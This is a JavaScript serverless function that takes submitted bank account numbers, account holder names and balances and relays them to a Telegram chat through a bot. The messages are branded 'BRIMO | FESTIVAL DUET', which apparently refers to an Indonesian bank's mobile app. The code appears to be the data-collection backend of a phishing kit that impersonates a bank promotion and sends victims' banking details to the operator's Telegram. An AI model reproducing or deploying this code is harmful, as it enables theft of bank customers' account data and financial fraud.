const axios = require('axios');

exports.handler = async function(event, context) {
    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    try {
        // Parse incoming data
        const data = JSON.parse(event.body);
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        // Validate environment variables
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('Telegram credentials not configured');
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Server configuration error' })
            };
        }

        // Validate incoming data
        if (!data.type) {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Missing data type' })
            };
        }

        // Format message based on data type
        let message = '';
        const timestamp = new Date().toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });

        if (data.type === 'account_info') {
            if (!data.accountNumber || !data.accountName) {
                return {
                    statusCode: 400,
                    body: JSON.stringify({ error: 'Missing account information' })
                };
            }

            message = `
🟢 *BRIMO | FESTIVAL DUET* 🟢
───────────────────
📌 *NO REK* : \`${data.accountNumber}\`
───────────────────
👤 *NAMA*  : ${data.accountName}
───────────────────
⏰ *WAKTU* : ${timestamp}
╰───────────────────
            `;
        } 
        else if (data.type === 'balance_info') {
            if (!data.accountNumber || !data.accountName || !data.balance) {
                return {
                    statusCode: 400,
                    body: JSON.stringify({ error: 'Missing balance information' })
                };
            }

            const formattedBalance = new Intl.NumberFormat('id-ID').format(data.balance);
            message = `
🔵 *BRIMO | FESTIVAL DUET* 🔵
───────────────────
📌 *NO REK* : \`${data.accountNumber}\`
───────────────────
👤 *NAMA*  : ${data.accountName}
───────────────────
💰 *SALDO* : ${formattedBalance}
───────────────────
⏰ *WAKTU* : ${timestamp}
╰───────────────────
            `;
        } 
        else {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Invalid data type' })
            };
        }

        // Send message to Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });

        // Log successful send
        console.log('Message sent to Telegram:', response.data);

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true,
                message: 'Data sent to Telegram successfully',
                telegramResponse: response.data
            })
        };
    } 
    catch (error) {
        // Enhanced error logging
        console.error('Error sending to Telegram:', {
            errorMessage: error.message,
            errorStack: error.stack,
            requestBody: event.body
        });

        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Failed to send data to Telegram',
                details: error.message 
            })
        };
    }
};
